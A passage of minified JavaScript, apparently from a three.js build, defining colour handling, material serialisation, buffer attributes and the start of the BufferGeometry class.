m=Un.dot(Pr),E=On.dot(Pr);if(E>=0&&m<=E)return e.copy(s);const x=m*c-l*E;if(x<=0&&c>=0&&E<=0)return a=c/(c-E),e.copy(n).addScaledVector(On,a);const f=u*E-m*h;if(f<=0&&h-u>=0&&m-E>=0)return pa.subVectors(s,r),a=(h-u)/(h-u+(m-E)),e.copy(r).addScaledVector(pa,a);const d=1/(f+x+p);return o=x*d,a=p*d,e.copy(n).addScaledVector(Un,o).addScaledVector(On,a)}equals(t){return t.a.equals(this.a)&&t.b.equals(this.b)&&t.c.equals(this.c)}}const go={aliceblue:15792383,antiquewhite:16444375,aqua:65535,aquamarine:8388564,azure:15794175,beige:16119260,bisque:16770244,black:0,blanchedalmond:16772045,blue:255,blueviolet:9055202,brown:10824234,burlywood:14596231,cadetblue:6266528,chartreuse:8388352,chocolate:13789470,coral:16744272,cornflowerblue:6591981,cornsilk:16775388,crimson:14423100,cyan:65535,darkblue:139,darkcyan:35723,darkgoldenrod:12092939,darkgray:11119017,darkgreen:25600,darkgrey:11119017,darkkhaki:12433259,darkmagenta:9109643,darkolivegreen:5597999,darkorange:16747520,darkorchid:10040012,darkred:9109504,darksalmon:15308410,darkseagreen:9419919,darkslateblue:4734347,darkslategray:3100495,darkslategrey:3100495,darkturquoise:52945,darkviolet:9699539,deeppink:16716947,deepskyblue:49151,dimgray:6908265,dimgrey:6908265,dodgerblue:2003199,firebrick:11674146,floralwhite:16775920,forestgreen:2263842,fuchsia:16711935,gainsboro:14474460,ghostwhite:16316671,gold:16766720,goldenrod:14329120,gray:8421504,green:32768,greenyellow:11403055,grey:8421504,honeydew:15794160,hotpink:16738740,indianred:13458524,indigo:4915330,ivory:16777200,khaki:15787660,lavender:15132410,lavenderblush:16773365,lawngreen:8190976,lemonchiffon:16775885,lightblue:11393254,lightcoral:15761536,lightcyan:14745599,lightgoldenrodyellow:16448210,lightgray:13882323,lightgreen:9498256,lightgrey:13882323,lightpink:16758465,lightsalmon:16752762,lightseagreen:2142890,lightskyblue:8900346,lightslategray:7833753,lightslategrey:7833753,lightsteelblue:11584734,lightyellow:16777184,lime:65280,limegreen:3329330,linen:16445670,magenta:16711935,maroon:8388608,mediumaquamarine:6737322,mediumblue:205,mediumorchid:12211667,mediumpurple:9662683,mediumseagreen:3978097,mediumslateblue:8087790,mediumspringgreen:64154,mediumturquoise:4772300,mediumvioletred:13047173,midnightblue:1644912,mintcream:16121850,mistyrose:16770273,moccasin:16770229,navajowhite:16768685,navy:128,oldlace:16643558,olive:8421376,olivedrab:7048739,orange:16753920,orangered:16729344,orchid:14315734,palegoldenrod:15657130,palegreen:10025880,paleturquoise:11529966,palevioletred:14381203,papayawhip:16773077,peachpuff:16767673,peru:13468991,pink:16761035,plum:14524637,powderblue:11591910,purple:8388736,rebeccapurple:6697881,red:16711680,rosybrown:12357519,royalblue:4286945,saddlebrown:9127187,salmon:16416882,sandybrown:16032864,seagreen:3050327,seashell:16774638,sienna:10506797,silver:12632256,skyblue:8900331,slateblue:6970061,slategray:7372944,slategrey:7372944,snow:16775930,springgreen:65407,steelblue:4620980,tan:13808780,teal:32896,thistle:14204888,tomato:16737095,turquoise:4251856,violet:15631086,wheat:16113331,white:16777215,whitesmoke:16119285,yellow:16776960,yellowgreen:10145074},nn={h:0,s:0,l:0},Pi={h:0,s:0,l:0};function Ir(i,t,e){return e<0&&(e+=1),e>1&&(e-=1),e<1/6?i+(t-i)*6*e:e<1/2?t:e<2/3?i+(t-i)*6*(2/3-e):i}class Ht{constructor(t,e,n){return this.isColor=!0,this.r=1,this.g=1,this.b=1,this.set(t,e,n)}set(t,e,n){if(e===void 0&&n===void 0){const r=t;r&&r.isColor?this.copy(r):typeof r=="number"?this.setHex(r):typeof r=="string"&&this.setStyle(r)}else this.setRGB(t,e,n);return this}setScalar(t){return this.r=t,this.g=t,this.b=t,this}setHex(t,e=le){return t=Math.floor(t),this.r=(t>>16&255)/255,this.g=(t>>8&255)/255,this.b=(t&255)/255,Wt.toWorkingColorSpace(this,e),this}setRGB(t,e,n,r=Wt.workingColorSpace){return this.r=t,this.g=e,this.b=n,Wt.toWorkingColorSpace(this,r),this}setHSL(t,e,n,r=Wt.workingColorSpace){if(t=Gl(t,1),e=xe(e,0,1),n=xe(n,0,1),e===0)this.r=this.g=this.b=n;else{const s=n<=.5?n*(1+e):n+e-n*e,o=2*n-s;this.r=Ir(o,s,t+1/3),this.g=Ir(o,s,t),this.b=Ir(o,s,t-1/3)}return Wt.toWorkingColorSpace(this,r),this}setStyle(t,e=le){function n(s){s!==void 0&&parseFloat(s)<1&&console.warn("THREE.Color: Alpha component of "+t+" will be ignored.")}let r;if(r=/^(\w+)\(([^\)]*)\)/.exec(t)){let s;const o=r[1],a=r[2];switch(o){case"rgb":case"rgba":if(s=/^\s*(\d+)\s*,\s*(\d+)\s*,\s*(\d+)\s*(?:,\s*(\d*\.?\d+)\s*)?$/.exec(a))return n(s[4]),this.setRGB(Math.min(255,parseInt(s[1],10))/255,Math.min(255,parseInt(s[2],10))/255,Math.min(255,parseInt(s[3],10))/255,e);if(s=/^\s*(\d+)\%\s*,\s*(\d+)\%\s*,\s*(\d+)\%\s*(?:,\s*(\d*\.?\d+)\s*)?$/.exec(a))return n(s[4]),this.setRGB(Math.min(100,parseInt(s[1],10))/100,Math.min(100,parseInt(s[2],10))/100,Math.min(100,parseInt(s[3],10))/100,e);break;case"hsl":case"hsla":if(s=/^\s*(\d*\.?\d+)\s*,\s*(\d*\.?\d+)\%\s*,\s*(\d*\.?\d+)\%\s*(?:,\s*(\d*\.?\d+)\s*)?$/.exec(a))return n(s[4]),this.setHSL(parseFloat(s[1])/360,parseFloat(s[2])/100,parseFloat(s[3])/100,e);break;default:console.warn("THREE.Color: Unknown color model "+t)}}else if(r=/^\#([A-Fa-f\d]+)$/.exec(t)){const s=r[1],o=s.length;if(o===3)return this.setRGB(parseInt(s.charAt(0),16)/15,parseInt(s.charAt(1),16)/15,parseInt(s.charAt(2),16)/15,e);if(o===6)return this.setHex(parseInt(s,16),e);console.warn("THREE.Color: Invalid hex color "+t)}else if(t&&t.length>0)return this.setColorName(t,e);return this}setColorName(t,e=le){const n=go[t.toLowerCase()];return n!==void 0?this.setHex(n,e):console.warn("THREE.Color: Unknown color "+t),this}clone(){return new this.constructor(this.r,this.g,this.b)}copy(t){return this.r=t.r,this.g=t.g,this.b=t.b,this}copySRGBToLinear(t){return this.r=jn(t.r),this.g=jn(t.g),this.b=jn(t.b),this}copyLinearToSRGB(t){return this.r=xr(t.r),this.g=xr(t.g),this.b=xr(t.b),this}convertSRGBToLinear(){return this.copySRGBToLinear(this),this}convertLinearToSRGB(){return this.copyLinearToSRGB(this),this}getHex(t=le){return Wt.fromWorkingColorSpace(fe.copy(this),t),Math.round(xe(fe.r*255,0,255))*65536+Math.round(xe(fe.g*255,0,255))*256+Math.round(xe(fe.b*255,0,255))}getHexString(t=le){return("000000"+this.getHex(t).toString(16)).slice(-6)}getHSL(t,e=Wt.workingColorSpace){Wt.fromWorkingColorSpace(fe.copy(this),e);const n=fe.r,r=fe.g,s=fe.b,o=Math.max(n,r,s),a=Math.min(n,r,s);let l,c;const u=(a+o)/2;if(a===o)l=0,c=0;else{const h=o-a;switch(c=u<=.5?h/(o+a):h/(2-o-a),o){case n:l=(r-s)/h+(r<s?6:0);break;case r:l=(s-n)/h+2;break;case s:l=(n-r)/h+4;break}l/=6}return t.h=l,t.s=c,t.l=u,t}getRGB(t,e=Wt.workingColorSpace){return Wt.fromWorkingColorSpace(fe.copy(this),e),t.r=fe.r,t.g=fe.g,t.b=fe.b,t}getStyle(t=le){Wt.fromWorkingColorSpace(fe.copy(this),t);const e=fe.r,n=fe.g,r=fe.b;return t!==le?`color(${t} ${e.toFixed(3)} ${n.toFixed(3)} ${r.toFixed(3)})`:`rgb(${Math.round(e*255)},${Math.round(n*255)},${Math.round(r*255)})`}offsetHSL(t,e,n){return this.getHSL(nn),this.setHSL(nn.h+t,nn.s+e,nn.l+n)}add(t){return this.r+=t.r,this.g+=t.g,this.b+=t.b,this}addColors(t,e){return this.r=t.r+e.r,this.g=t.g+e.g,this.b=t.b+e.b,this}addScalar(t){return this.r+=t,this.g+=t,this.b+=t,this}sub(t){return this.r=Math.max(0,this.r-t.r),this.g=Math.max(0,this.g-t.g),this.b=Math.max(0,this.b-t.b),this}multiply(t){return this.r*=t.r,this.g*=t.g,this.b*=t.b,this}multiplyScalar(t){return this.r*=t,this.g*=t,this.b*=t,this}lerp(t,e){return this.r+=(t.r-this.r)*e,this.g+=(t.g-this.g)*e,this.b+=(t.b-this.b)*e,this}lerpColors(t,e,n){return this.r=t.r+(e.r-t.r)*n,this.g=t.g+(e.g-t.g)*n,this.b=t.b+(e.b-t.b)*n,this}lerpHSL(t,e){this.getHSL(nn),t.getHSL(Pi);const n=gr(nn.h,Pi.h,e),r=gr(nn.s,Pi.s,e),s=gr(nn.l,Pi.l,e);return this.setHSL(n,r,s),this}setFromVector3(t){return this.r=t.x,this.g=t.y,this.b=t.z,this}applyMatrix3(t){const e=this.r,n=this.g,r=this.b,s=t.elements;return this.r=s[0]*e+s[3]*n+s[6]*r,this.g=s[1]*e+s[4]*n+s[7]*r,this.b=s[2]*e+s[5]*n+s[8]*r,this}equals(t){return t.r===this.r&&t.g===this.g&&t.b===this.b}fromArray(t,e=0){return this.r=t[e],this.g=t[e+1],this.b=t[e+2],this}toArray(t=[],e=0){return t[e]=this.r,t[e+1]=this.g,t[e+2]=this.b,t}fromBufferAttribute(t,e){return this.r=t.getX(e),this.g=t.getY(e),this.b=t.getZ(e),this}toJSON(){return this.getHex()}*[Symbol.iterator](){yield this.r,yield this.g,yield this.b}}const fe=new Ht;Ht.NAMES=go;let nc=0;class gi extends Qn{constructor(){super(),this.isMaterial=!0,Object.defineProperty(this,"id",{value:nc++}),this.uuid=mi(),this.name="",this.type="Material",this.blending=Yn,this.side=cn,this.vertexColors=!1,this.opacity=1,this.transparent=!1,this.alphaHash=!1,this.blendSrc=Yr,this.blendDst=jr,this.blendEquation=vn,this.blendSrcAlpha=null,this.blendDstAlpha=null,this.blendEquationAlpha=null,this.blendColor=new Ht(0,0,0),this.blendAlpha=0,this.depthFunc=Yi,this.depthTest=!0,this.depthWrite=!0,this.stencilWriteMask=255,this.stencilFunc=Js,this.stencilRef=0,this.stencilFuncMask=255,this.stencilFail=wn,this.stencilZFail=wn,this.stencilZPass=wn,this.stencilWrite=!1,this.clippingPlanes=null,this.clipIntersection=!1,this.clipShadows=!1,this.shadowSide=null,this.colorWrite=!0,this.precision=null,this.polygonOffset=!1,this.polygonOffsetFactor=0,this.polygonOffsetUnits=0,this.dithering=!1,this.alphaToCoverage=!1,this.premultipliedAlpha=!1,this.forceSinglePass=!1,this.visible=!0,this.toneMapped=!0,this.userData={},this.version=0,this._alphaTest=0}get alphaTest(){return this._alphaTest}set alphaTest(t){this._alphaTest>0!=t>0&&this.version++,this._alphaTest=t}onBuild(){}onBeforeRender(){}onBeforeCompile(){}customProgramCacheKey(){return this.onBeforeCompile.toString()}setValues(t){if(t!==void 0)for(const e in t){const n=t[e];if(n===void 0){console.warn(`THREE.Material: parameter '${e}' has value of undefined.`);continue}const r=this[e];if(r===void 0){console.warn(`THREE.Material: '${e}' is not a property of THREE.${this.type}.`);continue}r&&r.isColor?r.set(n):r&&r.isVector3&&n&&n.isVector3?r.copy(n):this[e]=n}}toJSON(t){const e=t===void 0||typeof t=="string";e&&(t={textures:{},images:{}});const n={metadata:{version:4.6,type:"Material",generator:"Material.toJSON"}};n.uuid=this.uuid,n.type=this.type,this.name!==""&&(n.name=this.name),this.color&&this.color.isColor&&(n.color=this.color.getHex()),this.roughness!==void 0&&(n.roughness=this.roughness),this.metalness!==void 0&&(n.metalness=this.metalness),this.sheen!==void 0&&(n.sheen=this.sheen),this.sheenColor&&this.sheenColor.isColor&&(n.sheenColor=this.sheenColor.getHex()),this.sheenRoughness!==void 0&&(n.sheenRoughness=this.sheenRoughness),this.emissive&&this.emissive.isColor&&(n.emissive=this.emissive.getHex()),this.emissiveIntensity&&this.emissiveIntensity!==1&&(n.emissiveIntensity=this.emissiveIntensity),this.specular&&this.specular.isColor&&(n.specular=this.specular.getHex()),this.specularIntensity!==void 0&&(n.specularIntensity=this.specularIntensity),this.specularColor&&this.specularColor.isColor&&(n.specularColor=this.specularColor.getHex()),this.shininess!==void 0&&(n.shininess=this.shininess),this.clearcoat!==void 0&&(n.clearcoat=this.clearcoat),this.clearcoatRoughness!==void 0&&(n.clearcoatRoughness=this.clearcoatRoughness),this.clearcoatMap&&this.clearcoatMap.isTexture&&(n.clearcoatMap=this.clearcoatMap.toJSON(t).uuid),this.clearcoatRoughnessMap&&this.clearcoatRoughnessMap.isTexture&&(n.clearcoatRoughnessMap=this.clearcoatRoughnessMap.toJSON(t).uuid),this.clearcoatNormalMap&&this.clearcoatNormalMap.isTexture&&(n.clearcoatNormalMap=this.clearcoatNormalMap.toJSON(t).uuid,n.clearcoatNormalScale=this.clearcoatNormalScale.toArray()),this.iridescence!==void 0&&(n.iridescence=this.iridescence),this.iridescenceIOR!==void 0&&(n.iridescenceIOR=this.iridescenceIOR),this.iridescenceThicknessRange!==void 0&&(n.iridescenceThicknessRange=this.iridescenceThicknessRange),this.iridescenceMap&&this.iridescenceMap.isTexture&&(n.iridescenceMap=this.iridescenceMap.toJSON(t).uuid),this.iridescenceThicknessMap&&this.iridescenceThicknessMap.isTexture&&(n.iridescenceThicknessMap=this.iridescenceThicknessMap.toJSON(t).uuid),this.anisotropy!==void 0&&(n.anisotropy=this.anisotropy),this.anisotropyRotation!==void 0&&(n.anisotropyRotation=this.anisotropyRotation),this.anisotropyMap&&this.anisotropyMap.isTexture&&(n.anisotropyMap=this.anisotropyMap.toJSON(t).uuid),this.map&&this.map.isTexture&&(n.map=this.map.toJSON(t).uuid),this.matcap&&this.matcap.isTexture&&(n.matcap=this.matcap.toJSON(t).uuid),this.alphaMap&&this.alphaMap.isTexture&&(n.alphaMap=this.alphaMap.toJSON(t).uuid),this.lightMap&&this.lightMap.isTexture&&(n.lightMap=this.lightMap.toJSON(t).uuid,n.lightMapIntensity=this.lightMapIntensity),this.aoMap&&this.aoMap.isTexture&&(n.aoMap=this.aoMap.toJSON(t).uuid,n.aoMapIntensity=this.aoMapIntensity),this.bumpMap&&this.bumpMap.isTexture&&(n.bumpMap=this.bumpMap.toJSON(t).uuid,n.bumpScale=this.bumpScale),this.normalMap&&this.normalMap.isTexture&&(n.normalMap=this.normalMap.toJSON(t).uuid,n.normalMapType=this.normalMapType,n.normalScale=this.normalScale.toArray()),this.displacementMap&&this.displacementMap.isTexture&&(n.displacementMap=this.displacementMap.toJSON(t).uuid,n.displacementScale=this.displacementScale,n.displacementBias=this.displacementBias),this.roughnessMap&&this.roughnessMap.isTexture&&(n.roughnessMap=this.roughnessMap.toJSON(t).uuid),this.metalnessMap&&this.metalnessMap.isTexture&&(n.metalnessMap=this.metalnessMap.toJSON(t).uuid),this.emissiveMap&&this.emissiveMap.isTexture&&(n.emissiveMap=this.emissiveMap.toJSON(t).uuid),this.specularMap&&this.specularMap.isTexture&&(n.specularMap=this.specularMap.toJSON(t).uuid),this.specularIntensityMap&&this.specularIntensityMap.isTexture&&(n.specularIntensityMap=this.specularIntensityMap.toJSON(t).uuid),this.specularColorMap&&this.specularColorMap.isTexture&&(n.specularColorMap=this.specularColorMap.toJSON(t).uuid),this.envMap&&this.envMap.isTexture&&(n.envMap=this.envMap.toJSON(t).uuid,this.combine!==void 0&&(n.combine=this.combine)),this.envMapIntensity!==void 0&&(n.envMapIntensity=this.envMapIntensity),this.reflectivity!==void 0&&(n.reflectivity=this.reflectivity),this.refractionRatio!==void 0&&(n.refractionRatio=this.refractionRatio),this.gradientMap&&this.gradientMap.isTexture&&(n.gradientMap=this.gradientMap.toJSON(t).uuid),this.transmission!==void 0&&(n.transmission=this.transmission),this.transmissionMap&&this.transmissionMap.isTexture&&(n.transmissionMap=this.transmissionMap.toJSON(t).uuid),this.thickness!==void 0&&(n.thickness=this.thickness),this.thicknessMap&&this.thicknessMap.isTexture&&(n.thicknessMap=this.thicknessMap.toJSON(t).uuid),this.attenuationDistance!==void 0&&this.attenuationDistance!==1/0&&(n.attenuationDistance=this.attenuationDistance),this.attenuationColor!==void 0&&(n.attenuationColor=this.attenuationColor.getHex()),this.size!==void 0&&(n.size=this.size),this.shadowSide!==null&&(n.shadowSide=this.shadowSide),this.sizeAttenuation!==void 0&&(n.sizeAttenuation=this.sizeAttenuation),this.blending!==Yn&&(n.blending=this.blending),this.side!==cn&&(n.side=this.side),this.vertexColors===!0&&(n.vertexColors=!0),this.opacity<1&&(n.opacity=this.opacity),this.transparent===!0&&(n.transparent=!0),this.blendSrc!==Yr&&(n.blendSrc=this.blendSrc),this.blendDst!==jr&&(n.blendDst=this.blendDst),this.blendEquation!==vn&&(n.blendEquation=this.blendEquation),this.blendSrcAlpha!==null&&(n.blendSrcAlpha=this.blendSrcAlpha),this.blendDstAlpha!==null&&(n.blendDstAlpha=this.blendDstAlpha),this.blendEquationAlpha!==null&&(n.blendEquationAlpha=this.blendEquationAlpha),this.blendColor&&this.blendColor.isColor&&(n.blendColor=this.blendColor.getHex()),this.blendAlpha!==0&&(n.blendAlpha=this.blendAlpha),this.depthFunc!==Yi&&(n.depthFunc=this.depthFunc),this.depthTest===!1&&(n.depthTest=this.depthTest),this.depthWrite===!1&&(n.depthWrite=this.depthWrite),this.colorWrite===!1&&(n.colorWrite=this.colorWrite),this.stencilWriteMask!==255&&(n.stencilWriteMask=this.stencilWriteMask),this.stencilFunc!==Js&&(n.stencilFunc=this.stencilFunc),this.stencilRef!==0&&(n.stencilRef=this.stencilRef),this.stencilFuncMask!==255&&(n.stencilFuncMask=this.stencilFuncMask),this.stencilFail!==wn&&(n.stencilFail=this.stencilFail),this.stencilZFail!==wn&&(n.stencilZFail=this.stencilZFail),this.stencilZPass!==wn&&(n.stencilZPass=this.stencilZPass),this.stencilWrite===!0&&(n.stencilWrite=this.stencilWrite),this.rotation!==void 0&&this.rotation!==0&&(n.rotation=this.rotation),this.polygonOffset===!0&&(n.polygonOffset=!0),this.polygonOffsetFactor!==0&&(n.polygonOffsetFactor=this.polygonOffsetFactor),this.polygonOffsetUnits!==0&&(n.polygonOffsetUnits=this.polygonOffsetUnits),this.linewidth!==void 0&&this.linewidth!==1&&(n.linewidth=this.linewidth),this.dashSize!==void 0&&(n.dashSize=this.dashSize),this.gapSize!==void 0&&(n.gapSize=this.gapSize),this.scale!==void 0&&(n.scale=this.scale),this.dithering===!0&&(n.dithering=!0),this.alphaTest>0&&(n.alphaTest=this.alphaTest),this.alphaHash===!0&&(n.alphaHash=!0),this.alphaToCoverage===!0&&(n.alphaToCoverage=!0),this.premultipliedAlpha===!0&&(n.premultipliedAlpha=!0),this.forceSinglePass===!0&&(n.forceSinglePass=!0),this.wireframe===!0&&(n.wireframe=!0),this.wireframeLinewidth>1&&(n.wireframeLinewidth=this.wireframeLinewidth),this.wireframeLinecap!=="round"&&(n.wireframeLinecap=this.wireframeLinecap),this.wireframeLinejoin!=="round"&&(n.wireframeLinejoin=this.wireframeLinejoin),this.flatShading===!0&&(n.flatShading=!0),this.visible===!1&&(n.visible=!1),this.toneMapped===!1&&(n.toneMapped=!1),this.fog===!1&&(n.fog=!1),Object.keys(this.userData).length>0&&(n.userData=this.userData);function r(s){const o=[];for(const a in s){const l=s[a];delete l.metadata,o.push(l)}return o}if(e){const s=r(t.textures),o=r(t.images);s.length>0&&(n.textures=s),o.length>0&&(n.images=o)}return n}clone(){return new this.constructor().copy(this)}copy(t){this.name=t.name,this.blending=t.blending,this.side=t.side,this.vertexColors=t.vertexColors,this.opacity=t.opacity,this.transparent=t.transparent,this.blendSrc=t.blendSrc,this.blendDst=t.blendDst,this.blendEquation=t.blendEquation,this.blendSrcAlpha=t.blendSrcAlpha,this.blendDstAlpha=t.blendDstAlpha,this.blendEquationAlpha=t.blendEquationAlpha,this.blendColor.copy(t.blendColor),this.blendAlpha=t.blendAlpha,this.depthFunc=t.depthFunc,this.depthTest=t.depthTest,this.depthWrite=t.depthWrite,this.stencilWriteMask=t.stencilWriteMask,this.stencilFunc=t.stencilFunc,this.stencilRef=t.stencilRef,this.stencilFuncMask=t.stencilFuncMask,this.stencilFail=t.stencilFail,this.stencilZFail=t.stencilZFail,this.stencilZPass=t.stencilZPass,this.stencilWrite=t.stencilWrite;const e=t.clippingPlanes;let n=null;if(e!==null){const r=e.length;n=new Array(r);for(let s=0;s!==r;++s)n[s]=e[s].clone()}return this.clippingPlanes=n,this.clipIntersection=t.clipIntersection,this.clipShadows=t.clipShadows,this.shadowSide=t.shadowSide,this.colorWrite=t.colorWrite,this.precision=t.precision,this.polygonOffset=t.polygonOffset,this.polygonOffsetFactor=t.polygonOffsetFactor,this.polygonOffsetUnits=t.polygonOffsetUnits,this.dithering=t.dithering,this.alphaTest=t.alphaTest,this.alphaHash=t.alphaHash,this.alphaToCoverage=t.alphaToCoverage,this.premultipliedAlpha=t.premultipliedAlpha,this.forceSinglePass=t.forceSinglePass,this.visible=t.visible,this.toneMapped=t.toneMapped,this.userData=JSON.parse(JSON.stringify(t.userData)),this}dispose(){this.dispatchEvent({type:"dispose"})}set needsUpdate(t){t===!0&&this.version++}}class pi extends gi{constructor(t){super(),this.isMeshBasicMaterial=!0,this.type="MeshBasicMaterial",this.color=new Ht(16777215),this.map=null,this.lightMap=null,this.lightMapIntensity=1,this.aoMap=null,this.aoMapIntensity=1,this.specularMap=null,this.alphaMap=null,this.envMap=null,this.combine=eo,this.reflectivity=1,this.refractionRatio=.98,this.wireframe=!1,this.wireframeLinewidth=1,this.wireframeLinecap="round",this.wireframeLinejoin="round",this.fog=!0,this.setValues(t)}copy(t){return super.copy(t),this.color.copy(t.color),this.map=t.map,this.lightMap=t.lightMap,this.lightMapIntensity=t.lightMapIntensity,this.aoMap=t.aoMap,this.aoMapIntensity=t.aoMapIntensity,this.specularMap=t.specularMap,this.alphaMap=t.alphaMap,this.envMap=t.envMap,this.combine=t.combine,this.reflectivity=t.reflectivity,this.refractionRatio=t.refractionRatio,this.wireframe=t.wireframe,this.wireframeLinewidth=t.wireframeLinewidth,this.wireframeLinecap=t.wireframeLinecap,this.wireframeLinejoin=t.wireframeLinejoin,this.fog=t.fog,this}}const ee=new L,Ii=new zt;class Be{constructor(t,e,n=!1){if(Array.isArray(t))throw new TypeError("THREE.BufferAttribute: array should be a Typed Array.");this.isBufferAttribute=!0,this.name="",this.array=t,this.itemSize=e,this.count=t!==void 0?t.length/e:0,this.normalized=n,this.usage=Qs,this._updateRange={offset:0,count:-1},this.updateRanges=[],this.gpuType=sn,this.version=0}onUploadCallback(){}set needsUpdate(t){t===!0&&this.version++}get updateRange(){return console.warn("THREE.BufferAttribute: updateRange() is deprecated and will be removed in r169. Use addUpdateRange() instead."),this._updateRange}setUsage(t){return this.usage=t,this}addUpdateRange(t,e){this.updateRanges.push({start:t,count:e})}clearUpdateRanges(){this.updateRanges.length=0}copy(t){return this.name=t.name,this.array=new t.array.constructor(t.array),this.itemSize=t.itemSize,this.count=t.count,this.normalized=t.normalized,this.usage=t.usage,this.gpuType=t.gpuType,this}copyAt(t,e,n){t*=this.itemSize,n*=e.itemSize;for(let r=0,s=this.itemSize;r<s;r++)this.array[t+r]=e.array[n+r];return this}copyArray(t){return this.array.set(t),this}applyMatrix3(t){if(this.itemSize===2)for(let e=0,n=this.count;e<n;e++)Ii.fromBufferAttribute(this,e),Ii.applyMatrix3(t),this.setXY(e,Ii.x,Ii.y);else if(this.itemSize===3)for(let e=0,n=this.count;e<n;e++)ee.fromBufferAttribute(this,e),ee.applyMatrix3(t),this.setXYZ(e,ee.x,ee.y,ee.z);return this}applyMatrix4(t){for(let e=0,n=this.count;e<n;e++)ee.fromBufferAttribute(this,e),ee.applyMatrix4(t),this.setXYZ(e,ee.x,ee.y,ee.z);return this}applyNormalMatrix(t){for(let e=0,n=this.count;e<n;e++)ee.fromBufferAttribute(this,e),ee.applyNormalMatrix(t),this.setXYZ(e,ee.x,ee.y,ee.z);return this}transformDirection(t){for(let e=0,n=this.count;e<n;e++)ee.fromBufferAttribute(this,e),ee.transformDirection(t),this.setXYZ(e,ee.x,ee.y,ee.z);return this}set(t,e=0){return this.array.set(t,e),this}getComponent(t,e){let n=this.array[t*this.itemSize+e];return this.normalized&&(n=ii(n,this.array)),n}setComponent(t,e,n){return this.normalized&&(n=ve(n,this.array)),this.array[t*this.itemSize+e]=n,this}getX(t){let e=this.array[t*this.itemSize];return this.normalized&&(e=ii(e,this.array)),e}setX(t,e){return this.normalized&&(e=ve(e,this.array)),this.array[t*this.itemSize]=e,this}getY(t){let e=this.array[t*this.itemSize+1];return this.normalized&&(e=ii(e,this.array)),e}setY(t,e){return this.normalized&&(e=ve(e,this.array)),this.array[t*this.itemSize+1]=e,this}getZ(t){let e=this.array[t*this.itemSize+2];return this.normalized&&(e=ii(e,this.array)),e}setZ(t,e){return this.normalized&&(e=ve(e,this.array)),this.array[t*this.itemSize+2]=e,this}getW(t){let e=this.array[t*this.itemSize+3];return this.normalized&&(e=ii(e,this.array)),e}setW(t,e){return this.normalized&&(e=ve(e,this.array)),this.array[t*this.itemSize+3]=e,this}setXY(t,e,n){return t*=this.itemSize,this.normalized&&(e=ve(e,this.array),n=ve(n,this.array)),this.array[t+0]=e,this.array[t+1]=n,this}setXYZ(t,e,n,r){return t*=this.itemSize,this.normalized&&(e=ve(e,this.array),n=ve(n,this.array),r=ve(r,this.array)),this.array[t+0]=e,this.array[t+1]=n,this.array[t+2]=r,this}setXYZW(t,e,n,r,s){return t*=this.itemSize,this.normalized&&(e=ve(e,this.array),n=ve(n,this.array),r=ve(r,this.array),s=ve(s,this.array)),this.array[t+0]=e,this.array[t+1]=n,this.array[t+2]=r,this.array[t+3]=s,this}onUpload(t){return this.onUploadCallback=t,this}clone(){return new this.constructor(this.array,this.itemSize).copy(this)}toJSON(){const t={itemSize:this.itemSize,type:this.array.constructor.name,array:Array.from(this.array),normalized:this.normalized};return this.name!==""&&(t.name=this.name),this.usage!==Qs&&(t.usage=this.usage),t}}class vo extends Be{constructor(t,e,n){super(new Uint16Array(t),e,n)}}class xo extends Be{constructor(t,e,n){super(new Uint32Array(t),e,n)}}class de extends Be{constructor(t,e,n){super(new Float32Array(t),e,n)}}let ic=0;const Re=new Zt,Lr=new ye,Fn=new L,be=new Rn,oi=new Rn,oe=new L;class Ie extends Qn{constructor(){super(),this.isBufferGeometry=!0,Object.defineProperty(this,"id",{value:ic++}),this.uuid=mi(),this.name="",this.type="BufferGeometry",this.index=null,this.attributes={},this.morphAttributes={},this.morphTargetsRelative=!1,this.groups=[],this.boundingBox=null,this.boundingSphere=null,this.drawRange={start:0,count:1/0},this.userData={}}getIndex(){return this.index}setIndex(t){return Array.isArray(t)?this.index=new(fo(t)?xo:vo)(t,1):this.index=t,this}getAttribute(t){return this.attributes[t]}setAttribute(t,e){return this.attributes[t]=e,this}deleteAttribute(t){return delete this.attributes[t],this}hasAttribute(t){return this.attributes[t]!==void 0}addGroup(t,e,n=0){this.groups.push({start:t,count:e,materialIndex:n})}clearGroups(){this.groups=[]}setDrawRange(t,e){this.drawRange.start=t,this.drawRange.count=e}applyMatrix4(t){const e=this.attributes.position;e!==void 0&&(e.applyMatrix4(t),e.needsUpdate=!0);const n=this.attributes.normal;if(n!==void 0){const s=new kt().getNormalMatrix(t);n.applyNormalMatrix(s),n.needsUpdate=!0}const r=this.attributes.tangent;return r!==void 0&&(r.transformDirection(t),r.needsUpdate=!0),this.boundingBox!==null&&this.computeBoundingBox(),this.boundingSphere!==null&&this.computeBoundingSphere(),this}applyQuaternion(t){return Re.makeRotationFromQuaternion(t),this.applyMatrix4(Re),this}rotateX(t){return Re.makeRotationX(t),this.applyMatrix4(Re),this}rotateY(t){return Re.makeRotationY(t),this.applyMatrix4(Re),this}rotateZ(t){return Re.makeRotationZ(t),this.applyMatrix4(Re),this}translate(t,e,n){return Re.makeTranslation(t,e,n),this.applyMatrix4(Re),this}scale(t,e,n){return Re.makeScale(t,e,n),this.applyMatrix4(Re),this}lookAt(t){return Lr.lookAt(t),Lr.updateMatrix(),this.applyMatrix4(Lr.matrix),this}center(){return this.computeBoundingBox(),this.boundingBox.getCenter(Fn).negate(),this.translate(Fn.x,Fn.y,Fn.z),this}setFromPoints(t){const e=[];for(let n=0,r=t.length;n<r;n++){const s=t[n];e.push(s.x,s.y,s.z||0)}return this.setAttribute("position",new de(e,3)),this}computeBoundingBox(){this.boundingBox===null&&(this.boundingBox=new Rn);const t=this.attributes.position,e=this.morphAttributes.position;if(t&&t.isGLBufferAttribute){console.error('THREE.BufferGeometry.computeBoundingBox(): GLBufferAttribute requires a manual bounding box. Alternatively set "mesh.frustumCulled" to "false".',this),this.boundingBox.set(new L(-1/0,-1/0,-1/0),new L(1/0,1/0,1/0));return}if(t!==void 0){if(this.boundingBox.setFromBufferAttribute(t),e)for(let n=0,r=e.length;n<r;n++){const s=e[n];be.setFromBufferAttribute(s),this.morphTargetsRelative?(oe.addVectors(this.boundingBox.min,be.min),this.boundingBox.expandByPoint(oe),oe.addVectors(this.boundingBox.max,be.max),this.boundingBox.expandByPoint(oe)):(this.boundingBox.expandByPoint(be.min),this.boundingBox.expandByPoint(be.max))}}else this.boundingBox.makeEmpty();(isNaN(this.boundingBox.min.x)||isNaN(this.boundingBox.min.y)||isNaN(this.boundingBox.min.z))&&console.error('THREE.BufferGeometry.computeBoundingBox(): Computed min/max have NaN values. The "position" attribute is likely to have NaN 